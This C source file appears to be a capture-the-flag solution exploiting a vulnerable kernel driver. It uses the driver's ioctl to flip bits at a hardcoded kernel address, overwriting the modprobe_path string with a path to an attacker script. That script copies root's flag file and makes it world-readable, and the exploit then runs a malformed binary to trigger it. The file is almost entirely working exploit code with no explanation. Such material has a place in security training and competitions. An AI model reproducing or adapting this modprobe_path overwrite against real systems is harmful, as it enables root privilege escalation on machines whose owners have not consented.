#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define DEVICE_NAME "flipper_hero"
#define FLIP 0x13370001

typedef struct {
    unsigned long long *address;
    int bit_position;
} request_t;

int fd; 

void flip(unsigned long long target_address, int bit_to_flip){
    request_t req;
    // Prepare the request
    req.address = target_address;
    req.bit_position = bit_to_flip;

    // Send the request to the driver
    if (ioctl(fd, FLIP, &req) < 0) {
        perror("ioctl failed");
        close(fd);
        return -1;
    }

    printf("Bit at position %d of address 0x%llx flipped successfully\n", bit_to_flip, target_address);
}

void flip_strings(char *str_a, char *str_b) {
    unsigned long long addr_a, addr_b;
    int bit_to_flip;

    for (int i = 0; str_a[i] && str_b[i]; i++) {
        addr_a = (unsigned long long)&str_a[i];
        addr_b = (unsigned long long)&str_b[i];
        char flipped = str_a[i] ^ str_b[i];

        for (int j = 0; j < 8; j++) {
            if ((flipped >> j) & 1) {
                bit_to_flip = j;
                flip(0xffffffff82dd4940 + i, bit_to_flip);
            }
        }
    }
}


int main() {
    
    system("echo -ne '#!/bin/sh\n/bin/cp /root/flag.txt /home/ctf/flag.txt\n/bin/chmod 777 /home/ctf/flag.txt' > /home/ctf/xxxx");
    system("chmod +x /home/ctf/xxxx");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/ctf/crash");
    system("chmod +x /home/ctf/crash");

    // Open the device file
    fd = open("/dev/flipper_hero", O_RDWR);
    if (fd < 0) {
        perror("Failed to open the device file");
        return -1;
    }

    char str_a[] = "/sbin/modprobe";
    char str_b[] = "/home/ctf/xxxx";
    flip_strings(str_a, str_b);

    system("/home/ctf/crash");
    system("cat /home/ctf/flag.txt");

    // Close the device file
    close(fd);

    return 0;
}